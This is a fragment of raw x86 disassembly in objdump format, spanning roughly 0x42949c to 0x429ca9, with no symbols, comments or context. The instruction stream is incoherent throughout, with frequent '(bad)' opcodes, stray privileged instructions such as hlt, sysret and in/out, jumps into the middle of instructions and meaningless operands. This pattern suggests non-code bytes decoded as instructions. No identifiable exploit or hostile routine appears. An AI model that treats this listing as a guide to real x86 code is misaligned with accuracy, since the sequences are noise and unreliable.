  42949c:	add    BYTE PTR [ebx],bh
  42949e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4294a2:	dec    ebp
  4294a3:	or     BYTE PTR [ebx],ch
  4294a5:	ret    0x458b
  4294a8:	lock jmp 0x42949c
  4294ab:	mov    ecx,DWORD PTR [eax]
  4294ad:	or     BYTE PTR [edi],al
  4294af:	mov    ecx,eax
  4294b1:	xor    DWORD PTR [edx+0x2],0x0
  4294b5:	mov    bh,0xc1
  4294b7:	adc    BYTE PTR [eax],dh
  4294b9:	iret   
  4294ba:	inc    ebp
  4294bb:	mov    DWORD PTR [ebx],0x4dfff8c5
  4294c1:	inc    BYTE PTR [ebx]
  4294c3:	xor    bh,al
  4294c5:	add    BYTE PTR [ecx],dl
  4294c7:	data16 adc al,bh
  4294ca:	dec    ecx
  4294cb:	fisttp WORD PTR [ecx+0x456604c0]
  4294d1:	add    dh,BYTE PTR ds:0x75e0845
  4294d7:	ret    0x4d
  4294da:	lea    ecx,[ebx+0x18728301]
  4294e0:	add    BYTE PTR [ebp+0x45],al
  4294e3:	cmp    cl,ch
  4294e5:	pushf  
  4294e6:	add    bh,al
  4294e8:	add    al,ch
  4294ea:	inc    ebp
  4294eb:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4294f1:	xor    eax,0x781084d
  4294f6:	push   eax
  4294f7:	cwde   
  4294f8:	push   ecx
  4294f9:	xor    al,BYTE PTR [ecx+0x32f89889]
  4294ff:	inc    ebp
  429500:	cmp    esp,DWORD PTR [eax]
  429502:	jbe    0x4294a0
  429504:	mov    eax,edi
  429506:	or     ah,dh
  429508:	inc    ebp
  429509:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42950f:	cmp    cl,BYTE PTR [ebx-0x74747664]
  429515:	in     al,dx
  429516:	hlt    
  429517:	push   eax
  429518:	push   eax
  429519:	push   ecx
  42951a:	push   ecx
  42951b:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  429521:	cwde   
  429522:	cwde   
  429523:	xor    dh,BYTE PTR [edx]
  429525:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42952b:	or     BYTE PTR [ebp+0x7],al
  42952e:	mov    eax,ecx
  429530:	clc    
  429531:	jb     0x4294f4
  429533:	add    BYTE PTR [ebp+0x55],cl
  429536:	or     DWORD PTR [edi],0xc251d150
  42953c:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  429546:	mov    edi,eax
  429548:	or     cl,al
  42954a:	inc    ebp
  42954b:	dec    ebp
  42954c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  429552:	or     WORD PTR [ecx],0x8998
  429557:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  42955d:	mov    edx,DWORD PTR [ecx+0x8]
  429560:	mov    eax,DWORD PTR [ebp-0x8]
  429563:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  42956a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429570:	inc    ebp
  429571:	dec    eax
  429572:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429578:	add    edx,DWORD PTR [ecx-0x8]
  42957b:	mov    ecx,DWORD PTR [ecx]
  42957d:	clc    
  42957e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429585:	mov    ecx,ebp
  429587:	clc    
  429588:	(bad)  
  429589:	popf   
  42958a:	inc    DWORD PTR [eax]
  42958c:	ret    0x8b
  42958f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429595:	mov    edi,esp
  429597:	hlt    
  429598:	test   ecx,esi
  42959a:	clc    
  42959b:	or     BYTE PTR [ebp+0x7],al
  42959e:	cmp    ecx,eax
  4295a0:	pushf  
  4295a1:	jb     0x4295d6
  4295a3:	add    BYTE PTR [eax-0x3f],al
  4295a6:	inc    eax
  4295a7:	daa    
  4295a8:	inc    ebp
  4295a9:	inc    ebp
  4295aa:	xor    eax,0x7f80803
  4295af:	dec    ebp
  4295b0:	cwde   
  4295b1:	add    esi,DWORD PTR [edx]
  4295b3:	clc    
  4295b4:	cmp    DWORD PTR [ecx],ecx
  4295b6:	or     al,0x8
  4295b8:	add    al,BYTE PTR [ebp+0x2c]
  4295bb:	xor    eax,0x7350845
  4295c0:	or     BYTE PTR [ebp+0x7],cl
  4295c3:	lea    ebx,[eax-0x748dcdff]
  4295c9:	add    BYTE PTR [eax*2-0x74b21438],cl
  4295d0:	mov    edx,DWORD PTR [eax]
  4295d2:	cld    
  4295d3:	dec    ebp
  4295d4:	push   eax
  4295d5:	sub    edx,DWORD PTR [ecx-0x75]
  4295d8:	add    eax,0xf172fc
  4295dd:	or     BYTE PTR [ebp+0x7],cl
  4295e0:	add    eax,ecx
  4295e2:	or     al,0x72
  4295e4:	add    DWORD PTR [eax],eax
  4295e6:	mov    ebx,0x29c2c1
  4295eb:	inc    ebp
  4295ec:	mov    eax,DWORD PTR [ebx]
  4295ee:	cmp    eax,0x3004d1c
  4295f4:	xbegin 0x66c821ee
  4295fa:	clc    
  4295fb:	or     BYTE PTR [ebp+0x45],al
  4295fe:	cmp    DWORD PTR ds:0x78b089c,esi
  429604:	adc    BYTE PTR [ebp+0x45],cl
  429607:	lea    eax,[ebp+0x33727501]
  42960d:	add    cl,ch
  42960f:	inc    ebp
  429610:	add    bl,ch
  429612:	add    BYTE PTR [ebx+0x45850845],cl
  429618:	je     0x4295a5
  42961a:	push   ebx
  42961b:	or     al,0x85
  42961d:	dec    ebp
  42961e:	std    
  42961f:	mov    bh,bh
  429621:	mov    BYTE PTR [ebp-0x75],al
  429624:	mov    edi,eax
  429626:	or     al,0x89
  429628:	inc    ebp
  429629:	clc    
  42962a:	mov    esp,esp
  42962c:	hlt    
  42962d:	call   DWORD PTR [edi-0x37]
  429630:	push   eax
  429631:	or     al,0x51
  429633:	push   ebp
  429634:	xor    ebp,esp
  429636:	mov    esi,0x457251
  42963b:	cmp    dh,al
  42963d:	pushf  
  42963e:	inc    ebp
  42963f:	(bad)  
  429640:	mov    edi,eax
  429642:	or     al,0x85
  429644:	add    al,bh
  429646:	inc    eax
  429648:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42964c:	or     ah,bh
  42964e:	inc    eax
  42964f:	push   eax
  429650:	jmp    0x4296a3
  429652:	mov    eax,DWORD PTR ds:0xe8720c
  429658:	mov    DWORD PTR [ebp-0x8],eax
  42965b:	jne    0x4296a2
  42965d:	jmp    0x4295ea
  42965f:	mov    ebp,DWORD PTR [eax]
  429661:	clc    
  429662:	retf   0xff50
  429665:	push   ecx
  429666:	mov    DWORD PTR ds:0x757210,eax
  42966c:	mov    ecx,DWORD PTR [ebp-0x4]
  42966f:	sub    esp,DWORD PTR [ebx-0x77]
  429672:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429679:	or     ah,bh
  42967b:	pop    es
  42967c:	ds cwde 
  42967e:	push   DWORD PTR [edx]
  429680:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429686:	(bad)  
  429687:	mov    bh,bh
  429689:	jmp    0x429677
  42968b:	leave  
  42968c:	jne    0x429696
  42968e:	call   0x2f8fe8
  429693:	in     al,dx
  429694:	dec    ebp
  429695:	add    dh,BYTE PTR [ebx]
  429697:	add    BYTE PTR [ebx],al
  429699:	inc    ebp
  42969a:	cmp    edi,DWORD PTR [eax]
  42969c:	je     0x42963a
  42969e:	mov    eax,edi
  4296a0:	or     al,0xf0
  4296a2:	add    BYTE PTR [ebp+0x458bf845],al
  4296a8:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4296ae:	adc    al,0x7
  4296b0:	enter  0x9fc0,0xa5
  4296b4:	rol    BYTE PTR [eax],0x5e
  4296b7:	mov    ecx,ecx
  4296b9:	or     al,0xc
  4296bb:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4296c2:	jmp    0x4296c3
  4296c4:	push   ebp
  4296c5:	mov    esp,ebp
  4296c7:	cld    
  4296c8:	inc    ebp
  4296c9:	inc    ebp
  4296ca:	or     DWORD PTR [ecx+0x457dec10],0x0
  4296d1:	push   esi
  4296d2:	push   esi
  4296d3:	mov    edi,0x7af080f
  4296d8:	add    bh,al
  4296da:	test   DWORD PTR [eax+0x3a7320f],ebx
  4296e0:	add    BYTE PTR [ecx+0x4540100f],cl
  4296e6:	mov    ebp,eax
  4296e8:	mov    ebp,edi
  4296ea:	lock call edx
  4296ed:	fcom   DWORD PTR [ebp+0x45]
  4296f0:	mov    eax,0x148a8b
  4296f5:	push   ecx
  4296f6:	enter  0xc145,0x83
  4296fa:	cmp    cl,BYTE PTR [eax]
  4296fc:	add    BYTE PTR [ebp+0x4d],al
  4296ff:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429705:	call   0xffa29274
  42970a:	cmp    eax,DWORD PTR [ebp-0xc]
  42970d:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429711:	push   ebp
  429712:	(bad)
  429715:	std    
  429716:	lock push DWORD PTR [edi+0x5d08fcdb]
  42971d:	inc    ebp
  42971e:	(bad)  
  42971f:	call   0xff7c93af
  429724:	add    al,BYTE PTR [ebp+0x37]
  429727:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  42972d:	jne    0x42972f
  42972f:	(bad)  
  429730:	cmp    edi,esp
  429732:	jne    0x429765
  429734:	mov    edi,edi
  429736:	or     BYTE PTR [ebx-0x307f0b49],cl
  42973c:	pop    ds
  42973d:	into   
  42973e:	je     0x429701
  429740:	mov    ebx,DWORD PTR [esi]
  429742:	or     BYTE PTR [ebp-0x49],al
  429745:	mov    esp,DWORD PTR [esi-0x77]
  429748:	mov    esi,0xfc451f0c
  42974d:	mov    eax,DWORD PTR [eax]
  42974f:	or     al,0x66
  429751:	sar    bl,0x3b
  429754:	xor    esi,DWORD PTR [ebp+0x66]
  429757:	xor    ecx,edi
  429759:	pop    edi
  42975a:	adc    bl,BYTE PTR [ebx+0x78]
  42975d:	ret    0xff
  429760:	cld    
  429761:	inc    ebp
  429762:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429768:	cld    
  429769:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429770:	push   0xffffff83
  429772:	pop    edi
  429773:	or     BYTE PTR [ebp+0x53],dh
  429776:	xorps  xmm1,xmm2
  429779:	test   BYTE PTR [eax+eax*1],bh
  42977c:	add    BYTE PTR [eax],al
  42977e:	adc    eax,eax
  429780:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429788:	jmp    DWORD PTR [eax]
  42978a:	ror    al,0x5e
  42978d:	inc    ebp
  42978e:	leave  
  42978f:	xor    ecx,DWORD PTR [eax]
  429791:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429797:	add    ch,al
  429799:	xor    edi,edi
  42979b:	xor    DWORD PTR [ebx],0x660033fc
  4297a1:	mov    DWORD PTR [ebp-0xc],ecx
  4297a4:	pcmpgtw mm0,mm0
  4297a7:	add    dl,ah
  4297a9:	leave  
  4297aa:	mov    edi,DWORD PTR [esi-0x7d]
  4297ad:	push   ax
  4297af:	dec    ebp
  4297b0:	mov    esi,DWORD PTR [ebx-0x75]
  4297b3:	lea    ebp,[eax-0x7c00fffc]
  4297b9:	xor    eax,DWORD PTR [eax]
  4297bb:	sysret 
  4297bd:	dec    ebp
  4297be:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  4297c5:	push   WORD PTR [ecx+0x8]
  4297c9:	jne    0x42978c
  4297cb:	ud0    ecx,DWORD PTR [ecx]
  4297ce:	mov    esi,DWORD PTR [edx]
  4297d0:	lods   al,BYTE PTR ds:[esi]
  4297d1:	add    BYTE PTR [eax],al
  4297d3:	data16 (bad) 
  4297d5:	iret   
  4297d6:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  4297dd:	cli    
  4297de:	inc    ebp
  4297df:	cmp    al,0x8d
  4297e1:	add    BYTE PTR [esi+0x2d],ah
  4297e4:	inc    ebp
  4297e5:	pop    ebp
  4297e6:	lea    ecx,[edi]
  4297e8:	mov    dl,bh
  4297ea:	add    BYTE PTR [edi],cl
  4297ec:	mov    DWORD PTR [eax+eax*8],edi
  4297ef:	mov    ebx,0x3a87
  4297f4:	add    BYTE PTR [ebx],ch
  4297f6:	inc    ebp
  4297f7:	data16 (bad) 
  4297f9:	clc    
  4297fa:	int3   
  4297fb:	cmp    eax,DWORD PTR [eax]
  4297fd:	je     0x429788
  4297ff:	push   0xffffffc8
  429801:	pop    edi
  429802:	xchg   DWORD PTR [ebp+0x0],eax
  429805:	data16 add BYTE PTR [ebp+0x45],cl
  429809:	lea    cx,[ebp+0x10]
  42980d:	jb     0x42980f
  42980f:	jmp    0x42979a
  429811:	call   eax
  429813:	clc    
  429814:	xchg   DWORD PTR [edi+0x1],edi
  429817:	mov    eax,DWORD PTR [eax]
  429819:	or     BYTE PTR [ebp-0x49],al
  42981c:	lea    eax,[eax+0x74003154]
  429822:	push   edi
  429823:	inc    edx
  429824:	jge    0x429825
  429826:	mov    DWORD PTR [edi],ecx
  429828:	fdiv   DWORD PTR [edi-0x6]
  42982b:	inc    DWORD PTR [eax]
  42982d:	xor    edx,DWORD PTR [eax+0x5f]
  429830:	xchg   DWORD PTR [ebx+0x1],ebx
  429833:	ret    0x0
  429836:	xor    BYTE PTR [ebp-0x51],cl
  429839:	cmp    edi,0xf0ff8904
  42983f:	data16 ror al,0x84
  429843:	rol    BYTE PTR [eax],0x3b
  429846:	add    al,dh
  429848:	dec    eax
  429849:	xchg   esp,eax
  42984a:	push   ebx
  42984b:	jmp    0x4297d8
  42984d:	push   ebp
  42984e:	add    esp,ebp
  429850:	add    ebp,esp
  429852:	mov    edx,DWORD PTR [edi+0x24]
  429855:	clc    
  429856:	dec    esi
  429857:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42985d:	cmp    BYTE PTR [ebx],al
  42985f:	jne    0x4297ea
  429861:	xor    esp,eax
  429863:	jmp    0x4599e6
  429868:	add    ebp,DWORD PTR [ecx+ecx*4]
  42986b:	jne    0x429861
  42986d:	call   0xffcc95c7
  429872:	clc    
  429873:	xchg   edi,eax
  429874:	sti    
  429875:	add    DWORD PTR [ebx],eax
  429877:	add    BYTE PTR [ebp+0x47],bl
  42987a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429880:	pop    ebp
  429881:	mov    DWORD PTR [esi-0x48],esi
  429884:	jmp    0x4298cd
  429886:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  42988c:	(bad)  
  42988e:	cmp    al,0x0
  429890:	cmp    eax,DWORD PTR [ebp+0x18]
  429893:	lea    ebx,[ebp-0x56]
  429896:	jle    0x429898
  429898:	jae    0x429823
  42989a:	mov    eax,esp
  42989c:	call   0xb900:0x8b005587
  4298a3:	inc    ebp
  4298a4:	push   ebp
  4298a5:	lea    ecx,[ebp-0x27ff4f12]
  4298ab:	mov    eax,edi
  4298ad:	int3   
  4298ae:	push   ebp
  4298af:	xchg   edi,eax
  4298b1:	add    esp,ebp
  4298b3:	add    BYTE PTR [eax],al
  4298b5:	inc    ebp
  4298b6:	add    BYTE PTR [ebp+0x8b3255],cl
  4298bc:	cld    
  4298bd:	mov    DWORD PTR [edx],edi
  4298bf:	aam    0x75
  4298c1:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  4298c7:	mov    DWORD PTR [ebx-0x50],edx
  4298ca:	test   BYTE PTR [ebp-0x1],0xe8
  4298ce:	mov    eax,DWORD PTR [eax]
  4298d0:	hlt    
  4298d1:	add    al,al
  4298d3:	mov    eax,DWORD PTR ds:0x890045a8
  4298d9:	dec    DWORD PTR [ebx+0x45fdf0e8]
  4298df:	inc    DWORD PTR [eax*2+0xf75854d]
  4298e6:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  4298ec:	call   0x7298f62d
  4298f1:	je     0x429951
  4298f3:	js     0x429954
  4298f5:	lock ret 0x7e
  4298f9:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  4298ff:	mov    edi,edi
  429901:	sbb    al,bl
  429903:	clc    
  429904:	add    BYTE PTR [ebp-0x73],bh
  429907:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42990d:	ror    BYTE PTR [eax],1
  42990f:	dec    ebp
  429910:	xchg   ebp,eax
  429911:	mov    edi,edi
  429913:	in     al,0x8b
  429915:	jge    0x4298a0
  429917:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42991d:	clc    
  42991e:	pop    esi
  42991f:	fist   DWORD PTR [ebp+0x5d398b5d]
  429925:	clc    
  429926:	add    al,0x6e
  429928:	mov    eax,DWORD PTR [ebx]
  42992a:	mov    BYTE PTR [ebp+0x0],dl
  42992d:	mov    edx,DWORD PTR [ebx-0x20]
  429930:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429936:	add    eax,0x3b3a73
  42993b:	adc    al,0x89
  42993d:	pop    eax
  42993e:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429942:	ret    0xf08
  429945:	cmp    al,0x2
  429947:	mov    DWORD PTR [edx],esi
  429949:	cld    
  42994a:	add    BYTE PTR [ebp+0x66],dl
  42994d:	add    eax,ebx
  42994f:	add    esp,eax
  429951:	sub    eax,eax
  429953:	or     BYTE PTR [ecx-0x77f474bb],cl
  429959:	add    BYTE PTR [eax],al
  42995b:	mov    DWORD PTR [ebx-0x24],ebx
  42995e:	push   edi
  42995f:	push   ebp
  429960:	clc    
  429961:	add    DWORD PTR [esi+0x1b0100],0x45
  429968:	out    0xff,eax
  42996a:	add    edx,DWORD PTR [eax]
  42996c:	jmp    0x429956
  42996e:	cmp    ch,0x43
  429971:	(bad)  
  429972:	jmp    0x40c821c4
  429977:	je     0x429903
  429979:	mov    eax,DWORD PTR [eax-0x10c78704]
  42997f:	inc    ebp
  429980:	add    BYTE PTR [ebx-0x770375],al
  429986:	add    ah,ch
  429988:	add    edx,esp
  42998a:	pop    edi
  42998b:	pop    ebp
  42998c:	push   ebp
  42998d:	inc    ebx
  42998e:	in     al,dx
  42998f:	pop    ebp
  429990:	in     al,dx
  429991:	cmp    edx,DWORD PTR [edi-0x8]
  429994:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  42999b:	add    al,0x47
  42999d:	push   ebp
  42999e:	mov    esp,ebp
  4299a0:	in     al,0x45
  4299a2:	dec    ebp
  4299a3:	push   esi
  4299a4:	test   DWORD PTR [eax+0xff010f],esi
  4299aa:	add    BYTE PTR [eax+0xc018b],dh
  4299b0:	leave  
  4299b1:	inc    ebp
  4299b2:	test   al,ch
  4299b4:	add    dh,bh
  4299b6:	add    bh,bh
  4299b8:	dec    ebp
  4299b9:	push   cs
  4299ba:	mov    DWORD PTR [ecx],eax
  4299bc:	hlt    
  4299bd:	push   es
  4299be:	dec    ebp
  4299bf:	leave  
  4299c0:	mov    DWORD PTR [eax],ecx
  4299c2:	clc    
  4299c3:	cmovge eax,ecx
  4299c6:	mov    ecx,0x85c2f0
  4299cc:	clc    
  4299cd:	pop    DWORD PTR [ebp+0x1]
  4299d0:	aas    
  4299d1:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  4299d8:	push   esi
  4299d9:	add    BYTE PTR [ebp-0x4],al
  4299dc:	mov    DWORD PTR [eax],eax
  4299de:	cld    
  4299df:	inc    bp
  4299e1:	add    DWORD PTR [edx],edi
  4299e3:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  4299eb:	mov    ebx,0xcd4f68
  4299f0:	mov    edi,DWORD PTR [ebx]
  4299f2:	or     al,0x75
  4299f4:	(bad)  
  4299f5:	xor    ecx,ebx
  4299f7:	enterw 0x4d01,0x87
  4299fc:	jmp    0x429a02
  429a01:	ret    
  429a02:	inc    ebp
  429a03:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429a09:	add    dh,cl
  429a0b:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429a13:	icebp  
  429a14:	or     BYTE PTR [eax+0x8f13bd2],al
  429a1a:	inc    ebp
  429a1b:	inc    edx
  429a1c:	mov    ecx,DWORD PTR [edx]
  429a1e:	or     al,0xf9
  429a20:	(bad)  
  429a21:	jne    0x4299f1
  429a23:	mov    cl,0x0
  429a26:	rol    BYTE PTR [esi+0x450134],1
  429a2c:	add    eax,edi
  429a2e:	cld    
  429a2f:	ret    
  429a30:	dec    ebp
  429a31:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429a37:	mov    edi,0xf82c8534
  429a3c:	jmp    0x429abb
  429a3e:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429a44:	mov    dl,0x8b
  429a46:	sub    cl,BYTE PTR [eax]
  429a48:	mov    ecx,ecx
  429a4a:	in     al,dx
  429a4b:	test   cl,dh
  429a4d:	add    BYTE PTR [edx],al
  429a4f:	add    BYTE PTR [eax-0x377a97b3],al
  429a55:	cmovge esi,esp
  429a58:	add    eax,DWORD PTR [eax]
  429a5a:	cld    
  429a5b:	mov    eax,DWORD PTR [ecx]
  429a5d:	adc    BYTE PTR [ebp+0x4d],cl
  429a60:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429a66:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429a6c:	cmp    esp,ebx
  429a6e:	jne    0x429a0c
  429a70:	mov    eax,edi
  429a72:	adc    ah,ch
  429a74:	push   ebp
  429a75:	test   DWORD PTR [ebx],esi
  429a77:	clc    
  429a78:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429a7e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429a81:	dec    ebp
  429a82:	adc    bh,al
  429a84:	push   0x8b85ff10
  429a89:	clc    
  429a8a:	or     al,0x50
  429a8c:	(bad)  
  429a8d:	push   ecx
  429a8e:	retf   
  429a8f:	mov    ebx,0xff4d8dc8
  429a94:	mov    DWORD PTR [ebp+0x8],eax
  429a97:	xor    eax,DWORD PTR [ebp-0x75]
  429a9a:	cmp    ebp,DWORD PTR [ebx]
  429a9c:	lsl    ebx,WORD PTR [edi-0x8]
  429aa0:	call   DWORD PTR [ebx-0x741bff75]
  429aa6:	(bad)  
  429aa7:	or     al,0x5b
  429aa9:	dec    ebp
  429aaa:	or     BYTE PTR [ebx],dh
  429aac:	inc    ebp
  429aad:	xor    esi,DWORD PTR ds:0x708088d
  429ab3:	in     eax,0x98
  429ab5:	add    BYTE PTR [edx],dh
  429ab7:	inc    ebp
  429ab8:	pop    edi
  429ab9:	xor    eax,edx
  429abb:	test   DWORD PTR [eax],0x81108b8b
  429ac1:	dec    ebp
  429ac2:	sub    al,0x33
  429ac4:	add    BYTE PTR [ebx],dh
  429ac6:	push   esi
  429ac7:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429acd:	mov    edi,eax
  429acf:	or     BYTE PTR [ebp+0x45],al
  429ad2:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429ad8:	cmp    cl,cl
  429ada:	pushf  
  429adb:	push   es
  429adc:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429ae3:	dec    ebp
  429ae4:	inc    ebp
  429ae5:	and    BYTE PTR [eax],0x50
  429ae8:	pushf  
  429ae9:	push   0x4de4d1c7
  429aee:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429af4:	fsubr  st,st(1)
  429af6:	xlat   BYTE PTR ds:[ebx]
  429af7:	rol    bh,cl
  429af9:	mov    edx,esp
  429afb:	or     BYTE PTR [ebp+0x4588f84d],al
  429b01:	mov    ecx,DWORD PTR [eax]
  429b03:	or     BYTE PTR [eax],al
  429b05:	push   ebp
  429b06:	mov    edi,DWORD PTR [eax+0xfc728b]
  429b0c:	dec    ebp
  429b0d:	enter  0xceba,0x8
  429b11:	retf   0x1807
  429b14:	ret    0x984d
  429b17:	mov    esi,DWORD PTR [edx]
  429b19:	or     al,0x33
  429b1b:	into   
  429b1c:	add    edx,esi
  429b1e:	add    ecx,edx
  429b20:	bswap  eax
  429b22:	ror    esi,0x98
  429b25:	dec    ebp
  429b26:	add    cl,ch
  429b28:	mov    edi,edi
  429b2a:	hlt    
  429b2b:	inc    esi
  429b2d:	inc    ebp
  429b2e:	ret    0x4533
  429b31:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429b37:	or     BYTE PTR [ebx],dh
  429b39:	dec    ebp
  429b3a:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429b40:	jne    0xff8c9b07
  429b46:	inc    ebp
  429b47:	inc    ebp
  429b48:	mov    esi,DWORD PTR [ebx]
  429b4a:	clc    
  429b4b:	pop    esi
  429b4c:	ret    0xcaeb
  429b4f:	mov    eax,esi
  429b51:	call   0x5203ec24
  429b56:	dec    ebp
  429b57:	add    eax,0xf8728b
  429b5c:	adc    eax,0xce0ccac9
  429b61:	push   ebp
  429b62:	ret    0xc6ec
  429b65:	in     al,dx
  429b66:	call   0x3342e86f
  429b6b:	push   edi
  429b6c:	add    edi,eax
  429b6e:	xor    eax,eax
  429b70:	jmp    0x429bb7
  429b72:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  429b78:	add    eax,edi
  429b7a:	shr    eax,cl
  429b7c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  429b82:	mov    edi,DWORD PTR [ecx]
  429b84:	in     al,dx
  429b85:	pushf  
  429b86:	ret    0x84c7
  429b89:	fcomp  DWORD PTR [eax-0x7607cd7b]
  429b8f:	inc    ebp
  429b90:	in     al,dx
  429b91:	cmp    BYTE PTR [ebp-0x64],al
  429b94:	mov    eax,edi
  429b96:	cld    
  429b97:	fmul   st(2),st
  429b99:	sbb    dl,al
  429b9b:	jmp    0x9c3b:0x374d45c1
  429ba2:	jbe    0x429b6b
  429ba4:	mov    esp,eax
  429ba6:	clc    
  429ba7:	add    BYTE PTR [ebp+0x0],cl
  429baa:	mov    ecx,ecx
  429bac:	lea    eax,[ebp-0x5]
  429baf:	mov    edi,edi
  429bb1:	call   0x51cdebfb
  429bb6:	hlt    
  429bb7:	xor    eax,edx
  429bb9:	mov    esi,0x987284
  429bbe:	xor    cl,dl
  429bc0:	mov    esi,eax
  429bc2:	hlt    
  429bc3:	into   
  429bc4:	inc    ebp
  429bc5:	scas   eax,DWORD PTR es:[edi]
  429bc6:	mov    ebp,ecx
  429bc8:	cld    
  429bc9:	add    dl,cl
  429bcb:	add    dl,al
  429bcd:	inc    ebp
  429bce:	shr    DWORD PTR [ebx],0x4d
  429bd1:	xor    edi,DWORD PTR [ebx]
  429bd3:	mov    DWORD PTR [edi],ecx
  429bd5:	clc    
  429bd6:	dec    esi
  429bd7:	inc    ebp
  429bd8:	dec    DWORD PTR [ebx-0x3d2b1775]
  429bde:	ret    0xc6ca
  429be1:	mov    BYTE PTR [ebp-0x32],0x53
  429be5:	scas   eax,DWORD PTR es:[edi]
  429be6:	inc    ebp
  429be7:	jmp    0x429c20
  429be9:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  429bf0:	pop    ebx
  429bf1:	xor    ecx,DWORD PTR [ebp+0x3]
  429bf4:	mov    eax,DWORD PTR [ebx]
  429bf6:	clc    
  429bf7:	test   edx,ecx
  429bf9:	mov    ecx,esi
  429bfb:	cld    
  429bfc:	call   0x8ab6e146
  429c01:	xor    ecx,DWORD PTR [eax+0x4533f303]
  429c07:	add    ecx,DWORD PTR [ebx-0x4974072d]
  429c0d:	fdiv   QWORD PTR [ebx]
  429c0f:	retf   0xce89
  429c12:	in     al,0xc1
  429c14:	inc    ebp
  429c15:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  429c1b:	into   
  429c1c:	mov    dh,0xc1
  429c1f:	call   0x8c16e1a8
  429c24:	(bad)  
  429c25:	cld    
  429c26:	mov    ecx,DWORD PTR [ebp-0x14]
  429c29:	xor    eax,ecx
  429c2b:	lea    eax,[ebp+0x8]
  429c2e:	mov    esi,DWORD PTR [edx-0x4]
  429c31:	add    dl,al
  429c33:	inc    ebp
  429c34:	mov    esp,0x32d8988b
  429c39:	dec    ebp
  429c3a:	mov    esi,DWORD PTR [ebx]
  429c3c:	cld    
  429c3d:	xor    eax,edx
  429c3f:	sub    ebp,DWORD PTR [eax-0x75]
  429c42:	int    0xec
  429c44:	sub    ecx,eax
  429c46:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  429c4c:	mov    esi,esp
  429c4e:	call   0x3416e9d7
  429c53:	inc    DWORD PTR [ebx]
  429c55:	mov    edi,DWORD PTR [ebx]
  429c57:	cld    
  429c58:	jne    0x429ca7
  429c5a:	mov    esi,DWORD PTR [ebx]
  429c5c:	aam    0x8d
  429c5e:	dec    ebp
  429c5f:	or     BYTE PTR [ebx],dh
  429c61:	jb     0x429c66
  429c63:	add    BYTE PTR [edi+0x45],bl
  429c66:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  429c6d:	xor    ebp,esp
  429c6f:	xor    eax,edi
  429c71:	sub    edi,esp
  429c73:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  429c79:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  429c80:	inc    ebp
  429c81:	xor    ecx,DWORD PTR [ecx+0x45891403]
  429c87:	clc    
  429c88:	mov    eax,edi
  429c8a:	nop
  429c8b:	fadd   QWORD PTR [eax]
  429c8d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  429c93:	jmp    0x429c1e
  429c95:	mov    eax,DWORD PTR [ecx]
  429c97:	fadd   DWORD PTR [eax]
  429c99:	inc    ebp
  429c9a:	or     DWORD PTR [ebx],esi
  429c9c:	dec    eax
  429c9d:	add    edx,DWORD PTR [ebx-0x2d]
  429ca0:	dec    ebp
  429ca1:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  429ca7:	inc    ebp
  429ca8:	push   eax
  429ca9:	mov    dl,BYTE PTR [ecx-0xd]
